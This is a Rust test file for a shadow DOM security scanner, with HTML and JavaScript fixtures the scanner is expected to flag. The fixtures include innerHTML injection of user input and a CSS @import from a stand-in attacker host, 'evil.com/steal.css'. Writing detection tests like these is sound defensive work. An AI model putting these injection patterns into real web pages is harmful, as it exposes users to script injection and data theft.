use crate::shadow_dom_audit::*;

#[test]
fn no_shadow_dom_no_issues() {
    assert!(analyze_shadow_dom("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_declarative_shadow_dom() {
    let body = r#"<template shadowrootmode="open"><p>Shadow content</p></template>"#;
    let issues = analyze_shadow_dom(body);
    assert!(issues.contains(&ShadowDomIssue::DeclarativeShadowDom));
}

#[test]
fn detects_legacy_shadowroot_attr() {
    let body = r#"<template shadowroot="open"><p>Shadow content</p></template>"#;
    let issues = analyze_shadow_dom(body);
    assert!(issues.contains(&ShadowDomIssue::DeclarativeShadowDom));
}

#[test]
fn detects_open_shadow_root() {
    let body = r#"<script>el.attachShadow({mode: "open"});</script>"#;
    let issues = analyze_shadow_dom(body);
    assert!(issues.contains(&ShadowDomIssue::OpenShadowRoot));
}

#[test]
fn detects_open_shadow_root_single_quotes() {
    let body = r#"<script>el.attachShadow({mode: 'open'});</script>"#;
    let issues = analyze_shadow_dom(body);
    assert!(issues.contains(&ShadowDomIssue::OpenShadowRoot));
}

#[test]
fn no_open_with_closed() {
    let body = r#"<script>el.attachShadow({mode: "closed"});</script>"#;
    let issues = analyze_shadow_dom(body);
    assert!(!issues.contains(&ShadowDomIssue::OpenShadowRoot));
}

#[test]
fn detects_inner_html_injection() {
    let body = r#"<script>
        const shadow = el.attachShadow({mode: "open"});
        shadow.innerHTML = userInput;
    </script>"#;
    let issues = analyze_shadow_dom(body);
    assert!(issues.contains(&ShadowDomIssue::InnerHtmlInjection));
}

#[test]
fn detects_insert_adjacent_html() {
    let body = r#"<script>
        el.attachShadow({mode: "open"});
        shadow.insertAdjacentHTML("beforeend", data);
    </script>"#;
    let issues = analyze_shadow_dom(body);
    assert!(issues.contains(&ShadowDomIssue::InnerHtmlInjection));
}

#[test]
fn no_injection_without_inner_html() {
    let body = r#"<script>el.attachShadow({mode: "open"});shadow.textContent = "safe";</script>"#;
    let issues = analyze_shadow_dom(body);
    assert!(!issues.contains(&ShadowDomIssue::InnerHtmlInjection));
}

#[test]
fn detects_style_injection_with_var() {
    let body = r#"<template shadowrootmode="open">
        <style>:host { color: var(--user-color); }</style>
    </template>"#;
    let issues = analyze_shadow_dom(body);
    assert!(issues.contains(&ShadowDomIssue::StyleInjection));
}

#[test]
fn detects_style_injection_with_import() {
    let body = r#"<template shadowrootmode="open">
        <style>@import url("https://evil.com/steal.css");</style>
    </template>"#;
    let issues = analyze_shadow_dom(body);
    assert!(issues.contains(&ShadowDomIssue::StyleInjection));
}

#[test]
fn no_style_injection_without_var_or_import() {
    let body = r#"<template shadowrootmode="open">
        <style>:host { color: red; }</style>
    </template>"#;
    let issues = analyze_shadow_dom(body);
    assert!(!issues.contains(&ShadowDomIssue::StyleInjection));
}

#[test]
fn detects_event_retarget_bypass() {
    let body = r#"<script>
        el.attachShadow({mode: "open"});
        shadow.addEventListener("click", (ev) => {
            const path = ev.composedPath();
            handleClick(path[0]);
        });
    </script>"#;
    let issues = analyze_shadow_dom(body);
    assert!(issues.contains(&ShadowDomIssue::EventRetargetBypass));
}

#[test]
fn no_retarget_with_event_target() {
    let body = r#"<script>
        el.attachShadow({mode: "open"});
        shadow.addEventListener("click", (event) => {
            const path = event.composedPath();
            if (event.target === el) { handle(); }
        });
    </script>"#;
    let issues = analyze_shadow_dom(body);
    assert!(!issues.contains(&ShadowDomIssue::EventRetargetBypass));
}

#[test]
fn detects_unsanitized_slot() {
    let body = r#"<template shadowrootmode="open">
        <slot name="content"></slot>
    </template>"#;
    let issues = analyze_shadow_dom(body);
    assert!(issues.contains(&ShadowDomIssue::UnsanitizedSlotContent));
}

#[test]
fn no_unsanitized_with_sanitize() {
    let body = r#"<template shadowrootmode="open">
        <slot name="content"></slot>
        <script>sanitize(slotContent);</script>
    </template>"#;
    let issues = analyze_shadow_dom(body);
    assert!(!issues.contains(&ShadowDomIssue::UnsanitizedSlotContent));
}

#[test]
fn severity_injection_highest() {
    assert_eq!(
        shadow_dom_severity(&ShadowDomIssue::InnerHtmlInjection),
        8.0
    );
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(
        shadow_dom_severity(&ShadowDomIssue::DeclarativeShadowDom),
        2.5
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        ShadowDomIssue::DeclarativeShadowDom,
        ShadowDomIssue::OpenShadowRoot,
    ];
    let mut seq = 0;
    let ops = shadow_dom_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(
        ShadowDomIssue::DeclarativeShadowDom.to_string(),
        "declarative_shadow_dom"
    );
    assert_eq!(
        ShadowDomIssue::OpenShadowRoot.to_string(),
        "open_shadow_root"
    );
    assert_eq!(
        ShadowDomIssue::InnerHtmlInjection.to_string(),
        "inner_html_injection"
    );
    assert_eq!(
        ShadowDomIssue::StyleInjection.to_string(),
        "style_injection"
    );
    assert_eq!(
        ShadowDomIssue::EventRetargetBypass.to_string(),
        "event_retarget_bypass"
    );
    assert_eq!(
        ShadowDomIssue::UnsanitizedSlotContent.to_string(),
        "unsanitized_slot_content"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_shadow_dom("").is_empty());
}
